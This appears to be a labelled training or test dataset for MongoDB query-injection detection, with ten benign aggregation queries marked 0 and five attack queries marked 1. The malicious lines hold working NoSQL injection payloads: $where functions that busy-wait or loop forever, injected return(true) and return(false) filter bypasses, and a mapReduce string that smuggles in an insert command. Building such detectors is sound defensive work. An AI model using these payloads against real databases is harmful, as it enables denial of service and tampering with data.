db.experiments.aggregate([{ $project: { A: 1, B: 1, sameElements: { $setEquals: [ "$A", "$B" ] }, _id: 0 } }])::::0
db.experiments.aggregate([{ $project: { A: 1, B: 1, commonToBoth: { $setIntersection: [ "$A", "$B" ] }, _id: 0 } }])::::0
db.experiments.aggregate([{ $project: { A:1, B: 1, allValues: { $setUnion: [ "$A", "$B" ] }, _id: 0 } }])::::0
db.experiments.aggregate([{ $project: { A: 1, B: 1, inBOnly: { $setDifference: [ "$B", "$A" ] }, _id: 0 } }])::::0
db.experiments.aggregate([{ $project: { A:1, B: 1, AisSubset: { $setIsSubset: [ "$A", "$B" ] }, _id:0 } }])::::0
db.survey.aggregate([{ $project: { responses: 1, isAnyTrue: { $anyElementTrue: [ "$responses" ] }, _id: 0 } }])::::0
db.survey.aggregate([{ $project: { responses: 1, isAllTrue: { $allElementsTrue: [ "$responses" ] }, _id: 0 } }])::::0
db.sales.aggregate( [{$project: {finalTotal: {$let: {vars: {total: { $add: [ '$price', '$tax' ] },discounted: { $cond: { if: '$applyDiscount', then: 0.9, else: 1 } }},in: { $multiply: [ "$$total", "$$discounted" ] }}}}}] )::::0
db.records.aggregate( [{ $project: { costsOneDollar: { $eq: [ "$price", { $literal: "$1" } ] } } }] )::::0
db.bids.aggregate( [{ $project: { item: 1, startAt: { $literal: 1 } } }] )::::0
db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < (function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<100000);return Math.max();})(); } } );::::1
db.collection.find({$where: function() {var search_year =’1995';while(1);var%20foo='bar’;return this.publicationYear == search_year || this.filmingYear == search_year || this.recordingYear == search_year;});::::1
db.collection.find({$where: function() {var search_year =’1995';return(false);var%20foo='bar’;return this.publicationYear == search_year || this.filmingYear == search_year || this.recordingYear == search_year;});::::1
db.collection.find({$where: function() {var search_year = ‘1995';return(true);var%20foo='bar’;return this.publicationYear == search_year || this.filmingYear == search_year || this.recordingYear == search_year;});::::1
db.stores.mapReduce(function() { for (var i = 0; i < this.items.length;   i++) { emit(this.name, this.items[i].a); } },function(kv) { return 1; }, { out:   ‘x’ }); db.injection.insert({success:1}); return 1;db.stores.   mapReduce(function() { { emit(1,1);   } }, function(name, sum) { return Array.   sum(sum); }, { out: ‘totals’ })::::1